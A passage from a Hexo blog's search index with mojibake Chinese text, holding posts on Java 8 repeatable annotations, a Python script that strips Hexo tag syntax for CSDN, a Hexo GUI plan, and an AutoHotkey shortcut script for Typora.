punctuation">&#125;</span></code></pre><p>é€šè¿‡ä½¿ç”¨å˜ä½“2,javaç¼–è¯‘å™¨éšå¼åœ°åœ¨åº•å±‚è®¾ç½®@Hintsæ³¨é‡Šã€‚è¿™å¯¹äºé€šè¿‡åå°„é˜…è¯»æ³¨é‡Šä¿¡æ¯å¾ˆé‡è¦ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Hint</span> hint <span class="token operator">=</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">Hint</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>hint<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// nullHints hints1 = Person.class.getAnnotation(Hints.class);System.out.println(hints1.value().length);  // 2Hint[] hints2 = Person.class.getAnnotationsByType(Hint.class);System.out.println(hints2.length);          // 2</span></code></pre><p>å°½ç®¡æˆ‘ä»¬ä»æ¥æ²¡æœ‰åœ¨<code>Personç±»</code>ä¸Šå£°æ˜<code>@Hints</code>æ³¨é‡Šï¼Œä½†é€šè¿‡<code>getnotation (hint .class)</code>ä»ç„¶å¯è¯»ã€‚ç„¶è€Œï¼Œæ›´æ–¹ä¾¿çš„æ–¹æ³•æ˜¯<code>getAnnotationsByType</code>ï¼Œå®ƒå…è®¸ç›´æ¥è®¿é—®æ‰€æœ‰å¸¦æ³¨é‡Šçš„<code>@Hin</code>æ³¨é‡Šã€‚</p><p>æ­¤å¤–ï¼ŒJava 8ä¸­æ³¨é‡Šçš„ä½¿ç”¨æ‰©å±•åˆ°äº†ä¸¤ä¸ªæ–°çš„ç›®æ ‡:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span>TYPE_PARAMETER<span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span>TYPE_USE<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@interface</span> <span class="token class-name">MyAnnotation</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></code></pre></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> æŠ€æœ¯å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pyè‡ªåŠ¨åŒ–è„šæœ¬å®ç°å»é™¤hexoæ ‡ç­¾æ’ä»¶è¯­æ³•</title>
      <link href="/posts/28f3a3fd/"/>
      <url>/posts/28f3a3fd/</url>
      
        <content type="html"><![CDATA[<h1>pyè‡ªåŠ¨åŒ–è„šæœ¬å®ç°å»é™¤hexoæ ‡ç­¾æ’ä»¶è¯­æ³•</h1><p>[TOC]</p><h2 id="éœ€æ±‚">éœ€æ±‚</h2><div class="story post-story"><p>é±¼å’Œç†ŠæŒä¸å¯å…¼å¾—,å½“é‡‡ç”¨<code>typora</code>ç¼–å†™mdæ–‡æ¡£æ—¶,typoraç­‰å…¶ä»–è½¯ä»¶æ˜¯ä¸æ”¯æŒhexoçš„æ’ä»¶è¯­æ³•çš„,æ•…è€Œä¸ä¼šå®æ—¶æ¸²æŸ“çš„.åªä¼šæ˜¾ç¤ºæºä»£ç : ä¾‹å¦‚</p><details yello><summary> æºç  </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>% note danger, note error/danger %<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>% note success, note done/success %<span class="token punctuation">&#125;</span></code></pre>              </div>            </details><p>å½“åŒæ­¥å‘è¡¨åˆ°CSDNç­‰å…¶ä»–åšå®¢æ—¶,ä¼šæŠŠæºä»£ç æ˜¾ç¤ºå‡ºæ¥,æ˜¾å¾—éå¸¸ä¸ç¾è§‚,ä¸”å«æœ‰ä¹±ç .</p><p>æ•…è€Œå†™ä¸€ä¸ªè‡ªåŠ¨åŒ–è„šæœ¬å»é™¤å«æœ‰ hexo è¯­æ³•çš„ å†…å®¹, å°è¯•è¿˜æºä¸€ä¸ªçº¯å‡€çš„mdæ–‡ä»¶</p></div><h2 id="ä»£ç ">ä»£ç </h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># @Author: float311@163.com; sizaif2000@163.com</span><span class="token comment"># @Description: å°†hexoåšå®¢ä¿®æ”¹ä¸ºcsdnå¯ä»¥ä½¿ç”¨çš„æ ¼å¼</span><span class="token comment"># @Date 2021/8/8 17:59</span><span class="token comment"># @Update 2021-08-09  10:17:50</span><span class="token comment"># @note:</span><span class="token comment">#   å·²çŸ¥bug:</span><span class="token comment">#          1. hexoè¯­æ³•ä¸èƒ½ä¸æ–‡æœ¬æ··ç”¨,å³å¤„åœ¨ä¸€è¡Œä¸­, ä¾‹å¦‚: å¸¦ &#123;% u ä¸‹åˆ’çº¿ %&#125; çš„æ–‡æœ¬ ; ä¼šå¯¼è‡´ æ–‡æœ¬å†…å®¹ä¸¢å¤±</span><span class="token comment">#          2. ä»£ç æ¡†ä¸­å†…å®¹ä¹Ÿä¼šè¢«å¤„ç†</span><span class="token keyword">import</span> sys<span class="token punctuation">,</span>re<span class="token keyword">def</span> <span class="token function">matchstring</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># radio, checkout note</span>    matchradio <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'&#123;% [rcn].*'</span><span class="token punctuation">,</span>line<span class="token punctuation">,</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>    <span class="token keyword">if</span> matchradio<span class="token punctuation">:</span>        <span class="token keyword">return</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>            <span class="token string">r'%&#125;'</span><span class="token punctuation">,</span>            <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token comment"># floding timeline, tab end</span>    matchall <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'&#123;% [fte].*'</span><span class="token punctuation">,</span>line<span class="token punctuation">,</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>    <span class="token keyword">if</span> matchall<span class="token punctuation">:</span>        <span class="token comment"># å…¨éƒ¨ä¸¢å¼ƒ</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    <span class="token comment"># link</span>    matchlink <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'&#123;% link .*'</span><span class="token punctuation">,</span>line<span class="token punctuation">,</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>    <span class="token keyword">if</span> matchlink<span class="token punctuation">:</span>        temp <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>        line <span class="token operator">=</span> <span class="token string">"["</span><span class="token operator">+</span>temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"]("</span><span class="token operator">+</span>re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'%&#125;'</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span>temp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">")"</span>        <span class="token keyword">return</span>  line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># audio,video</span>    matchaudio <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'&#123;% [av].*'</span><span class="token punctuation">,</span>line<span class="token punctuation">,</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>    <span class="token keyword">if</span> matchaudio<span class="token punctuation">:</span>        <span class="token keyword">return</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token comment"># &lt;!--ç±»</span>    matchall2 <span class="token operator">=</span> line<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"&lt;!--"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> matchall2<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">def</span> <span class="token function">modify</span><span class="token punctuation">(</span>original<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    æ ¹æ®hexo MDæ–‡ä»¶ç”ŸæˆCSDNåšå®¢é€‚ç”¨çš„MDæ–‡ä»¶    :param original: æºæ–‡ä»¶    :param result: æ–°æ–‡ä»¶    """</span>    content <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>original<span class="token punctuation">,</span> <span class="token string">"r+"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> o<span class="token punctuation">:</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> o<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> line<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"&#123;%"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">and</span> line<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"&lt;!--"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                content <span class="token operator">+=</span> line            <span class="token keyword">else</span><span class="token punctuation">:</span>                line <span class="token operator">=</span> matchstring<span class="token punctuation">(</span>line<span class="token punctuation">)</span>                <span class="token keyword">if</span> line <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    content <span class="token operator">+=</span> line    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token string">"w+"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> n<span class="token punctuation">:</span>        n<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    original_md <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">".md"</span>    result_md <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">".md"</span>    modify<span class="token punctuation">(</span>original_md<span class="token punctuation">,</span> result_md<span class="token punctuation">)</span></code></pre>              </div>            </details></div><h2 id="ä½¿ç”¨æ–¹æ³•">ä½¿ç”¨æ–¹æ³•</h2><div class="story post-story"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># æ–‡ä»¶åä¸éœ€è¦å¸¦md</span>$ py main æºæ–‡ä»¶ è¾“å‡ºæ–‡ä»¶</code></pre></div><h2 id="å·²çŸ¥bug">å·²çŸ¥bug</h2><div class="story post-story"><ol><li><s>radio,checkout,note æ–‡æœ¬å†…å®¹ä¸­ä¸èƒ½å«æœ‰â€™,'(é€—å·), ä¼šå¯¼è‡´åˆ†å‰²æ•°æ®ä¸¢å¤±</s></li><li>hexoè¯­æ³•ä¸èƒ½ä¸æ–‡æœ¬æ··ç”¨,å³å¤„åœ¨ä¸€è¡Œä¸­, ä¾‹å¦‚: å¸¦<code>&#123;% u ä¸‹åˆ’çº¿ %&#125;çš„æ–‡æœ¬</code>; ä¼šå¯¼è‡´æ–‡æœ¬å†…å®¹ä¸¢å¤±</li><li>ä»£ç æ¡†ä¸­çš„å†…å®¹ä¹Ÿä¼šè¢«å¤„ç†</li></ol><p>â€‹        <strong>ä¸Šé¢çš„æƒ…å†µæš‚æ—¶éœ€è¦æ‰‹åŠ¨å¤„ç†</strong></p></div><h2 id="æ„Ÿè°¢">æ„Ÿè°¢</h2><div class="story post-story"><p>æ„Ÿè°¢ <a href="mailto:float311@163.com">float311@163.com</a></p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è„šæœ¬ </tag>
            
            <tag> æŠ€æœ¯å‘ </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo-Gui Project</title>
      <link href="/posts/739d4da5/"/>
      <url>/posts/739d4da5/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h2 id="hexoå›¾å½¢ç•Œé¢-guiéœ€æ±‚æ–‡æ¡£">hexoå›¾å½¢ç•Œé¢ guiéœ€æ±‚æ–‡æ¡£</h2><div class="story post-story"><ul><li>[ ] éƒ¨ç½²åˆ°github</li><li>[ ] ä¸€é”®åˆ›å»ºæ–‡ç« ,å¹¶è‡ªåŠ¨èµ„æºç®¡ç†å™¨ä¸­æ‰“å¼€_postæ–‡ä»¶å¤¹</li><li>[ ] ä¸€é”®åˆ›å»ºpage,å¹¶è‡ªåŠ¨èµ„æºç®¡ç†å™¨ä¸­æ‰“å¼€sourceæ–‡ä»¶å¤¹</li><li>[ ] ä¸€é”®æœ¬åœ°é¢„è§ˆ</li><li>[ ] ä¸€é”®ç”Ÿæˆ,å‘å¸ƒåˆ°githubä»“åº“( éœ€è¦é…ç½®ä»“åº“åç§°, å¾…è®¨è®º)</li><li>[ ] ä¸€é”®æ‰“å¼€æ›´æ”¹hexoé…ç½®</li><li>[ ] ä¸€é”®æ‰“å¼€æ›´æ”¹hexo ä¸»é¢˜é…ç½®</li></ul><h3 id="ä¸€é”®åˆ›å»ºæ–‡ç« ">ä¸€é”®åˆ›å»ºæ–‡ç« </h3><p>å‡ ç§æ–¹æ¡ˆ:</p><p><strong>é€‰æ‹©å…¶ä¸­ä¸€ç§</strong></p><ul><li>[ ] ä¸€é”®åˆ›å»ºæ–‡ç« ,å¹¶è‡ªåŠ¨èµ„æºç®¡ç†å™¨ä¸­æ‰“å¼€_postæ–‡ä»¶å¤¹</li><li>[ ] ä¸€é”®åˆ›å»ºæ–‡ç« ,å¹¶è‡ªåŠ¨è°ƒç”¨typoraæ‰“å¼€æ–‡ç« </li></ul><h3 id="ä¸€é”®åˆ›å»ºpage">ä¸€é”®åˆ›å»ºpage</h3><p>æ–¹æ¡ˆé›·åŒ åˆ›å»ºæ–‡ç« </p><h3 id="ä¸€é”®æœ¬åœ°é¢„è§ˆ">ä¸€é”®æœ¬åœ°é¢„è§ˆ</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo s -g</code></pre><h3 id="ä¸€é”®ç”Ÿæˆ-å‘å¸ƒåˆ°githubä»“åº“">ä¸€é”®ç”Ÿæˆ,å‘å¸ƒåˆ°githubä»“åº“</h3><p>è‹¥ç›´æ¥è°ƒç”¨</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo s -d</code></pre><p>åˆ™ä¼šäº¤äº’è¦æ±‚è¾“å…¥ githubç”¨æˆ·åå’Œå¯†ç è¿›è¡ŒéªŒè¯</p><p>ä¸æƒ³äº¤äº’è¾“å…¥çš„è¯,</p><ol><li><p>æå‰è®¾å®š ç”¨æˆ·åå’Œå¯†ç </p></li><li><p>ä½¿ç”¨sshkey gitæ¨é€</p></li></ol><h3 id="ä¸€é”®æ‰“å¼€è®¾ç½®hexoé…ç½®">ä¸€é”®æ‰“å¼€è®¾ç½®hexoé…ç½®</h3><p>ç±»åŒ æ›´æ”¹hexoä¸»é¢˜é…ç½®</p><h3 id="ä¸€é”®æ‰“å¼€æ›´æ”¹hexo-ä¸»é¢˜é…ç½®">ä¸€é”®æ‰“å¼€æ›´æ”¹hexo ä¸»é¢˜é…ç½®</h3><p>éœ€è¦åœ¨hexo æ ¹ç›®å½•ä¸‹ æ–°å»º<code>_config.ä¸»é¢˜.yml</code></p><p>è°ƒç”¨ ç¨‹åºæ‰“å¼€, æˆ–è€… æ‰“å¼€æ‰€åœ¨æ–‡ä»¶å¤¹,æˆ–è€… æ ¹æ®ä¸»é¢˜ä¸€é”®éƒ¨ç½²(å¾…è®¨è®º, å·¥ä½œé‡å¤§)</p><p><strong>é€‰æ‹©å…¶ä¸­ä¸€ç§</strong></p><ul><li>[ ] è°ƒç”¨ç¨‹åºæ‰“å¼€ e.g  sublime text, notep++,ç­‰</li><li>[ ] ç›´æ¥æ‰“å¼€æ‰€åœ¨æ–‡ä»¶å¤¹,ç”¨æˆ·è‡ªå·±æ‰“å¼€é…ç½®</li><li>[ ] è°ƒç”¨çª—å£,gui è®¾å®šå‚æ•°(å·¥ä½œé‡å¤§)</li></ul></div>]]></content>
      
      
      <categories>
          
          <category> é¡¹ç›® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> githubè®¡åˆ’ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AutoHotkey+Typora å®ç°å¿«æ·é”®è¾“å…¥Hexoæ ‡ç­¾æ’ä»¶</title>
      <link href="/posts/96be5746/"/>
      <url>/posts/96be5746/</url>
      
        <content type="html"><![CDATA[<h1>AutoHotkey+Typora å®ç°å¿«æ·é”®è¾“å…¥hexoæ ‡ç­¾æ’ä»¶</h1><p>[toc]</p><h2 id="éœ€æ±‚">éœ€æ±‚</h2><div class="story post-story"><p>ä½¿ç”¨hexoå†™åšå®¢æ—¶,hexoåŒ…æ‹¬ä¸»é¢˜æ–‡ä»¶,æä¾›äº†ä¸°å¯Œçš„æ ‡ç­¾æ’ä»¶ç¾åŒ–,åœ¨åšå®¢ä¸Šéå¸¸ç¾è§‚ç®€æ´,ç”šæ˜¯å–œæ¬¢.</p><p>ä½†è¯­æ³•å†™èµ·æ¥æ¯”è¾ƒéº»çƒ¦,éœ€è¦æ¯æ¬¡æŸ¥è¯¢,æˆ–è€…æ‰‹æ‰“.</p><p>äººç±»çš„æœ¬è´¨æ˜¯å»æ‰é‡å¤å·¥ä½œ,<code>æ‡’æ˜¯æé«˜ç”Ÿäº§åŠ›çš„æœ€å¤§éšœç¢</code>.</p><p>æ•…è€Œæƒ³åˆ°äº†ä½¿ç”¨å¿«æ·é”®çš„æ–¹å¼åœ¨typoraä¸­å¿«é€Ÿçš„æ’å…¥è¯­æ³•</p></div><h2 id="æ‰€éœ€ç¯å¢ƒ">æ‰€éœ€ç¯å¢ƒ</h2><div class="story post-story"><div class='checkbox green checked'><input type="radio" checked="checked"/>            <p>AutoHotkey</p>            </div><div class='checkbox cyan checked'><input type="radio" checked="checked"/>            <p>Typora</p>            </div><p><strong>AutoHotkey</strong>:</p><p>å»å®˜ç½‘å®‰è£…å³å¯</p><img src="https://gitee.com/sizaif/images/raw/master/img/20210808210510.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210808210510.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210808210508667" style="zoom:50%;" /><div class="tag link"><a class="link-card" title="AutoHotkeyå®˜ç½‘" href="https://www.autohotkey.com/"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></div><div class="right"><p class="text">AutoHotkeyå®˜ç½‘</p><p class="url">https://www.autohotkey.com/</p></div></a></div><p><strong>Typora</strong>:</p><p>å»å®˜ç½‘å®‰è£…</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210808210608.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210808210608.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210808210606079"></p><div class="tag link"><a class="link-card" title="Typoraå®˜ç½‘" href="https://typora.io/"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></div><div class="right"><p class="text">Typoraå®˜ç½‘</p><p class="url">https://typora.io/</p></div></a></div></div><h2 id="ç¼–å†™Autohotkeyè„šæœ¬">ç¼–å†™Autohotkeyè„šæœ¬</h2><div class="story post-story"><h3 id="åˆ›å»ºxxx-ahkæ–‡ä»¶">åˆ›å»ºxxx.ahkæ–‡ä»¶</h3><p>ç²˜è´´æˆ‘å†™çš„ä»£ç è¿›å», å¯è‡ªå®šä¹‰è„šæœ¬,æ·»åŠ å…¶ä»–åŠŸèƒ½.</p><p><code>^</code> : ctrl</p><p><code>!</code>: alt</p><p><code>#</code>: win</p><p><code>+</code>: shift</p><p><code>~</code>: alt+tab</p><details green><summary> ä»£ç  </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">;</span> Typora<span class="token punctuation">;</span> å¿«æ·è®¾ç½®å…¼å®¹hexoæ ¼å¼<span class="token punctuation">;</span> SendInput <span class="token punctuation">&#123;</span>Text<span class="token punctuation">&#125;</span> è§£å†³ä¸­æ–‡è¾“å…¥æ³•é—®é¢˜<span class="token comment">#IfWinActive ahk_exe Typora.exe</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">;</span> ctrl+1 tab    ^1::addtabcode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">;</span> ctrl+2  note    ^2::addnotecode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">;</span> ctrl+3  folding    ^3::addfoldingcode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">;</span> ctrl+4  <span class="token function">link</span>    ^4::addlinkcode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">;</span> ctrl+5  span    ^5::addspancode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">;</span> ctrl+6  radio    ^6::addradiocode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> å¿«æ·è®¾ç½®tab<span class="token function-name function">addtabcode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    clipboard :<span class="token operator">=</span> <span class="token string">"&#123;% tabs tab-id %&#125;<span class="token variable"><span class="token variable">`</span>n<span class="token variable">`</span></span>t&lt;!-- tab 1 --><span class="token variable"><span class="token variable">`</span>nreplace<span class="token variable">`</span></span>n&lt;!-- endtab --><span class="token variable"><span class="token variable">`</span>n<span class="token operator">&lt;</span><span class="token operator">!</span>-- tab <span class="token number">2</span> --<span class="token operator">></span><span class="token variable">`</span></span>nreplace<span class="token variable"><span class="token variable">`</span>n<span class="token operator">&lt;</span><span class="token operator">!</span>-- endtab --<span class="token operator">></span><span class="token variable">`</span></span>n&#123;% endtabs %&#125;"</span>    Send ^v    <span class="token builtin class-name">return</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> å¿«æ·è®¾ç½®note<span class="token function-name function">addnotecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    clipboard :<span class="token operator">=</span> <span class="token string">"&#123;% note danger, note error/danger %&#125;<span class="token variable"><span class="token variable">`</span>n<span class="token punctuation">&#123;</span>% note success, note done/success %<span class="token punctuation">&#125;</span><span class="token string">"    Send ^v    return&#125;; å¿«æ·è®¾ç½®foldingaddfoldingcode()&#123;    clipboard := "</span><span class="token punctuation">&#123;</span>% folding green, text %<span class="token punctuation">&#125;</span><span class="token variable">`</span></span>n&#123;% endfolding %&#125;"</span>    Send ^v    <span class="token builtin class-name">return</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> å¿«æ·è®¾ç½®link<span class="token function-name function">addlinkcode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    clipboard :<span class="token operator">=</span> <span class="token string">"&#123;% link title, link %&#125;"</span>    Send ^v    <span class="token builtin class-name">return</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> å¿«æ·è®¾ç½®span<span class="token function-name function">addspancode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    clipboard :<span class="token operator">=</span> <span class="token string">"&#123;% span parm, txt %&#125;"</span>    Send ^v    <span class="token builtin class-name">return</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> å¿«æ·è®¾ç½®radio<span class="token function-name function">addradiocode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    clipboard :<span class="token operator">=</span> <span class="token string">"&#123;% radio green checked, text %&#125;"</span>    Send ^v    <span class="token builtin class-name">return</span>   <span class="token punctuation">&#125;</span></code></pre>              </div>            </details><h3 id="ç¼–è¯‘è¿è¡Œ-xxx-ahkæ–‡ä»¶">ç¼–è¯‘è¿è¡Œ xxx.ahkæ–‡ä»¶</h3><p>é¼ æ ‡å³é”®æ–‡ä»¶ <code>compiler script</code></p><p>åŒå‡»å¯åŠ¨è„šæœ¬</p><h3 id="Typoraä¸­è¿è¡Œ">Typoraä¸­è¿è¡Œ</h3><p>å¿«å»æ„‰å¿«çš„æµ‹è¯•å§!</p></div><h2 id="é‡åˆ°é—®é¢˜">é‡åˆ°é—®é¢˜</h2><div class="story post-story"><p>å½“è®¾ç½® <code>alt</code> æŒ‰é”®çš„æ—¶å€™, å¦‚æœè¿è¡Œæ—¶æŒ‰ä¸‹å‡ºç°é”®ç›˜åŠŸèƒ½å˜å¾—è¯¡å¼‚,</p><p>è¯·å†æŒ‰ä¸€æ¬¡<code>alt</code></p></div><h2 id="ç›¸å…³æ–‡æ¡£">ç›¸å…³æ–‡æ¡£</h2><div class="story post-story"><p>ä½†é±¼å’Œç†ŠæŒä¸å¯å…¼å¾—,å½“é‡‡ç”¨<code>typora</code>ç¼–å†™mdæ–‡æ¡£æ—¶,typoraç­‰å…¶ä»–è½¯ä»¶æ˜¯ä¸æ”¯æŒhexoçš„æ’ä»¶è¯­æ³•çš„,æ•…è€Œä¸ä¼šå®æ—¶æ¸²æŸ“çš„.åªä¼šæ˜¾ç¤ºæºä»£ç : ä¾‹å¦‚</p><details yello><summary> æºç  </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>% note danger, note error/danger %<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>% note success, note done/success %<span class="token punctuation">&#125;</span></code></pre>              </div>            </details><p>å½“å»CSDNç­‰å…¶ä»–åšå®¢å‘è¡¨æ—¶,ä¼šæŠŠæºä»£ç æ˜¾ç¤ºå‡ºæ¥,æ˜¾å¾—éå¸¸ä¸‘.</p><p>è§£å†³æ–¹æ³•:</p><div class="tag link"><a class="link-card" title="pyè‡ªåŠ¨åŒ–è„šæœ¬å®ç°å»é™¤hexoæ ‡ç­¾æ’ä»¶è¯­æ³•" href="https://www.sizaif.com/2021/08/08/py%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E5%8E%BB%E9%99%A4hexo%E6%A0%87%E7%AD%BE%E6%8F%92%E4%BB%B6%E8%AF%AD%E6%B3%95/"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></div><div class="right"><p class="text">pyè‡ªåŠ¨åŒ–è„šæœ¬å®ç°å»é™¤hexoæ ‡ç­¾æ’ä»¶è¯­æ³•</p><p 